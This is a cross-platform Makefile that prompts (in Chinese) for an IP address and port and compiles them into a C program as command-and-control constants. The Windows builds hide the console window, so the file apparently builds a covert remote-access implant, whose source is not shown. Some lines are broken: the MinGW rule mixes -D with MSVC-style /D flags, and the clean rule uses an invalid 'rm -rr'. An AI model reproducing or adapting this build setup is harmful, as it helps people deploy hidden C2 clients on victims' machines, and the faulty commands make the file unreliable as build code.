
CC = gcc
SRC = main.c
TARGET = main
BIN = $(TARGET)

define wininp
C2_IP := $(shell cmd /c "<nul set /p \"请输入IP: \"")
C2_PORT := $(shell cmd /c "<nul set /p \"请输入端口: \"")
endef

define uninp
C2_IP := $(shell sh -c 'read -p "请输入IP: " t;echo $$t')
C2_PORT := $(shell sh -c 'read -p "请输入端口: " t;echo $$t')
endef

all:
ifeq ($(OS),Windows_NT)
	$(eval $(call wininp))
ifeq ($(CC),cl)
	# Windows MSVC
	$(CC) $(SRC) /Fe:$(BIN).exe /DC2_IP="$(C2_IP)" /DC2_PORT="$(C2_PORT)" /link /subsystem:windows ws2_32.lib
else
	# Windows MinGW
	$(CC) $(SRC) -o $(BIN) -mwindows -lws2_32 -DC2_IP=\"$(C2_IP)\" /DC2_PORT="$(C2_PORT)"
endif
endif

ifeq ($(shell uname -s),Linux)
	$(eval $(call uninp))
	# Linux
	$(CC) $(SRC) -o $(BIN) -DC2_IP=\"$(C2_IP)\" -DC2_PORT="$(C2_PORT)"
endif

ifeq ($(shell uname -s),Darwin)
	$(eval $(call uninp))
	# macOS(Darwin)
	$(CC) $(SRC) -o $(BIN) -Wl,-no_launcher,-sectcreate,__TEXT,__info_plist,/dev/null -DC2_IP=\"$(C2_IP)\" -DC2_PORT="$(C2_PORT)"
endif

clean:
ifeq ($(OS),Windows_NT)
	del /f $(TARGET).* 2>nul
	del /f $(TARGET) 2>nul
else
	rm -rf $(TARGET)
	rm -rr $(TARGET).*
endif
